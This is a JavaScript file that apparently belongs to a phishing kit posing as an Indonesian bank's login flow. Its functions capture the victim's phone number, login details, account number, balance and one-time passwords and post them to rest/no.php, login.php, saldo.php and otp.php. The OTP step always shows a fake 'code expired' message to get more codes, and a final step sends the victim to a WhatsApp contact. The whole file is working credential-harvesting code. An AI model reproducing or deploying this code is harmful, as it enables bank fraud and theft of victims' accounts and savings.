function sendHp() {
event.preventDefault();
        var nomor = document.getElementById("nohp").value;
        sessionStorage.setItem("nomor", nomor);
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses...";
 
 
      $.ajax({
            type: 'POST',
            url: 'rest/no.php',
            data: $('#formHP').serialize(),
            datatype: 'text',
            
            complete: function(data) {
            setTimeout(function(){
  window.location.href='login.html'
  document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
 $('.process1').fadeOut();
    }, 800);
            }
        })
     }
     
function sendLog() {
event.preventDefault();
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
      $.ajax({
            type: 'POST',
            url: 'rest/login.php',
            data: $('#formLog').serialize(),
            datatype: 'text',          
            complete: function(data) {
            setTimeout(function(){
  window.location.href='saldo.html'
  document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
 $('.process1').fadeOut();
    var nomortel = document.getElementById('nomorku').value;
    sessionStorage.setItem("nomortel", nomortel);    
    var namanya = document.getElementById('nama').value;
    sessionStorage.setItem("namanya", namanya);    
    var noreke = document.getElementById('rek').value;
    sessionStorage.setItem("noreke", noreke);
    }, 800);
            }
        })
     }     
     
     
function sendSaldo() {
event.preventDefault();
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
      $.ajax({
            type: 'POST',
            url: 'rest/saldo.php',
            data: $('#jualpuki').serialize(),
            datatype: 'text',          
            complete: function(data) {
            setTimeout(function(){
  window.location.href='otp.html'
  document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
 $('.process1').fadeOut();
 var phone = document.getElementById("nomorsaya").value;
 sessionStorage.setItem("phone", phone);
 var user = document.getElementById("namaku").value;
 sessionStorage.setItem("user", user);
 var card = document.getElementById("norekku").value;
 sessionStorage.setItem("card", card);
 var duet = document.getElementById("saldo").value;
 sessionStorage.setItem("duet", duet);
    }, 800);
            }
        })
     }     


// otp
function sendOtp() {
  event.stopPropagation();
    event.preventDefault();
  
 document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
$.ajax({
 type: 'POST',
 url: 'rest/otp.php',
 async: false,
 dataType: 'JSON',
 data: $('#form2').serialize(),
 
 complete: function(data) {
            console.log('Complete')
setTimeout(function(){  
       
      
    }, 2000);
     $("#notif").text("- Kode Virtual sudah kadaluarsa -");
     $("#notif").css("color", "red");
        }
    });
      setTimeout(() => {
     document.getElementById("notif").innerHTML = "Untuk mendapatkan kode Virtual,<br/>Silahkan klik tombol dibawah ini";
     $("#djload").hide();  
   $("#notif").css("color", "black");
 $("#sixpin").val("");
document.getElementById('btnSubmit1').innerHTML = "Selanjutnya";      
              
   }, 4000);

  }




// datawa

function getcs(){
 $("#djload").show();   
  audio4 = document.getElementById("bsiku");
  audio1 = document.getElementById("bsi");
    audio4.play();
     audio1.load();
    audio4.loop = false
setTimeout(function(){  
location.href='wa';
    }, 5000);
    setTimeout(function(){
    $("#djload").hide();   
    }, 5100);      
}     
